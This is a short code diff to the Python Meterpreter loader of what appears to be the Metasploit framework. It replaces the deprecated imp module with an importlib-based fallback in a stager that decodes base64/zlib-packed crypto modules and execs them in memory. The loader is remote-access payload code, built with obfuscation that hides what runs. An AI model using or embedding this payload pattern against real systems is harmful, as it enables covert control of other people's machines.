@@ -157,9 +157,15 @@ module Payload::Python::MeterpreterLoader
     aes_encryptor = Rex::Text.encode_base64(Rex::Text.zlib_deflate(python_aes_source))
     rsa_encryptor = Rex::Text.encode_base64(Rex::Text.zlib_deflate(python_rsa_source))
     %Q?
-import codecs,imp,base64,zlib
-met_aes = imp.new_module('met_aes')
-met_rsa = imp.new_module('met_rsa')
+import codecs,base64,zlib
+try:
+  import importlib.util
+  new_module = lambda x: importlib.util.spec_from_loader(x, loader=None)
+except ImportError:
+  import imp
+  new_module = imp.new_module
+met_aes = new_module('met_aes')
+met_rsa = new_module('met_rsa')
 exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{aes_encryptor}')[0])),'met_aes','exec'), met_aes.__dict__)
 exec(compile(zlib.decompress(base64.b64decode(codecs.getencoder('utf-8')('#{rsa_encryptor}')[0])),'met_rsa','exec'), met_rsa.__dict__)
 sys.modules['met_aes'] = met_aes
